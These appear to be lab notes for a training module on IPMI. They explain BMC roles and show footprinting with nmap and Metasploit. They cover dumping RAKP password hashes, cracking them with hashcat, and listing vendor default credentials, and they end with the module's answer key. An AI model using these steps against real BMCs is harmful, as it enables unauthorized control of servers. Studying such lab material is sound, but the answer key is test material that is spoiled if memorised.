# IPMI

## What IPMI Is

The **Intelligent Platform Management Interface (IPMI)** is like a tiny, always-on remote control built into a server's hardware. It runs on a dedicated microcontroller — the **Baseboard Management Controller (BMC)** — that is completely separate from the server's CPU and operating system. Because the BMC has its own power and network path, you can manage the machine even when the OS has crashed, the machine is powered off, or you can't log in normally.

IPMI communicates over **UDP port 623**.

### What IPMI Lets You Do

- Power a machine on, off, or reboot it remotely — even with a dead OS.
- View console output (Serial-over-LAN) as if plugged into a serial cable.
- Change BIOS settings before the OS boots.
- Read hardware sensors (temperature, fans, voltages) and hardware logs.
- Push firmware/BIOS updates remotely.
- Receive hardware-failure alerts (e.g. via SNMP).

> **Why access to a BMC is so valuable:** Gaining BMC access is *nearly equivalent to physical access*. You can monitor, reboot, power off, or even reinstall the host OS. The most common BMCs are **HP iLO, Dell DRAC, and Supermicro IPMI**.

### Main Components

| Component | Role |
| --- | --- |
| **BMC** | The on-board microcontroller that runs IPMI. |
| **ICMB** | Intelligent Chassis Management Bus — lets chassis talk to chassis. |
| **IPMB** | Intelligent Platform Management Bus — local bus the BMC uses to talk to components. |
| **IPMI Memory** | Stores event logs, inventory, and configuration. |
| **Comm interfaces** | LAN, serial, PCI management bus, local connectors. |

### Security Note

Because IPMI gives low-level access, an exposed or default-credentialed BMC is a high-risk target. Best practices: isolate the management LAN, change defaults, use strong credentials, enable IPMIv2 encryption/auth, patch BMC firmware, and monitor access.

## Footprinting the Service

### Nmap

```shell
$ sudo nmap -sU --script ipmi-version -p 623 10.129.1.159

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|     IPMI-2.0
|   UserAuth: password, md5, md2, null
|_  Level: 1.5, 2.0
```

### Metasploit – Version Scan

```shell
msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 > set rhosts 10.129.42.195
msf6 > run

[+] 10.129.42.195:623 - IPMI - IPMI-2.0 ...
```

## The IPMI 2.0 RAKP Hash Disclosure

This is the headline vulnerability and the basis for the module answers.

- **The issue:** IPMI 2.0's RAKP (Remote Authenticated Key-exchange Protocol) **leaks a salted SHA1/MD5 password hash** for *any valid user* — and it does so **before authentication completes**.
- **The impact:** You can request the hash for a known username and crack it offline.
- **No direct fix:** The weakness is part of the IPMI spec itself.

### Default Credentials Worth Knowing

| Product | Username | Password |
| --- | --- | --- |
| Dell iDRAC | `root` | `calvin` |
| HP iLO | `Administrator` | randomized 8-char string (uppercase + digits) |
| Supermicro IPMI | `ADMIN` | `ADMIN` |

### Dumping Hashes with Metasploit

`ipmi_dumphashes` retrieves the RAKP hash and even auto-cracks common passwords:

```shell
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 > set rhosts 10.129.42.195
msf6 > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d48...140541444d494e:a3e82878...
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
```

### Cracking the Hash with Hashcat

IPMI RAKP hashes use **Hashcat mode 7300**. Save the hash to a file, then crack with a wordlist:

```shell
$ hashcat -m 7300 hashed.txt rockyou.txt
...
e9ad0ee0...576ff7:trinity
Status...........: Cracked
Hash.Mode........: 7300 (IPMI2 RAKP HMAC-SHA1)
```

For HP iLO's randomized 8-char default, a mask attack is more efficient than a wordlist:

```shell
$ hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
# -1 ?d?u defines a custom charset of digits + uppercase letters
```

> **Tip:** Experimenting with different wordlists is crucial. If `rockyou.txt` doesn't crack it, try others before assuming the password is uncrackable.

---

## Module Answers

> **1. What username is configured for accessing the host via IPMI?**
> **`admin`**

> **2. What is the account's cleartext password?**
> **`trinity`**
>
> Recovered by dumping the RAKP hash with `ipmi_dumphashes`, saving it as `hashed.txt`, and cracking with `hashcat -m 7300 hashed.txt rockyou.txt`.
